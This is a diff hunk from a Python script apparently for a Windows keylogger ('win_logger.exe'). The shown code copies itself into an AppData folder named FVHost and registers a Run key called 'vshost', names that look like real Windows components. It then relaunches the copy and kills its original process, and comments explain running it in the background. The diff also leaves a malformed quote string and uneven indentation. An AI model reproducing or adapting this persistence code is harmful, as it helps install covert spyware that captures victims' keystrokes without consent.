@@ -21,23 +21,28 @@ import getpass
 import shutil
 import base64
 
-if os.path.exists(os.environ["appdata"] +'\\FVHost'+'\\win_logger.exe'):
-     
+''''
+by default the script ready to Compile to "EXE" to run as script background please comment  this lines
+from line 28 to line 41
+''''
+if os.path.exists(os.environ["appdata"] +'\\FVHost'+'\\win_logger.exe'):     
      pass 
 else: 
-    if not os.path.exists(os.environ["appdata"] +'\\FVHost'+'\\win_logger.exe'):
-         #pass
-          try:               
-              copy_path_new= shutil.copytree(os.path.abspath('.'),os.environ["appdata"] +'\\FVHost' )                    
-              copy_path = os.environ["appdata"] +'\\FVHost'+'\\win_logger.exe'
-              subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v vshost /t REG_SZ /d "' + copy_path + '"', shell=True)
-              subprocess.Popen(os.environ["appdata"] +'\\FVHost'+'\\win_logger.exe',shell=True)
-              ospid = os.getpid()
-              commandpid  = 'taskkill /f /pid '+str(ospid)
-              subprocess.check_output (commandpid,shell=True)
-              exit()
-          except FileExistsError:
-                 pass
+     try:               
+         copy_path_new= shutil.copytree(os.path.abspath('.'),os.environ["appdata"] +'\\FVHost' )                    
+         copy_path = os.environ["appdata"] +'\\FVHost'+'\\win_logger.exe'
+         subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v vshost /t REG_SZ /d "' + copy_path + '"', shell=True)
+         subprocess.Popen(os.environ["appdata"] +'\\FVHost'+'\\win_logger.exe',shell=True)
+         ospid = os.getpid()
+         commandpid  = 'taskkill /f /pid '+str(ospid)
+         subprocess.check_output (commandpid,shell=True)
+         exit()
+     except FileExistsError:
+            pass
+ '''
+ to run the script as background please uncomment this lines  
+ from line 46 to line 65
+ '''
 #if os.path.exists(os.environ["appdata"] +'\\'+'FVHost'+os.path.basename(__file__)):
 #    pass
 #else:
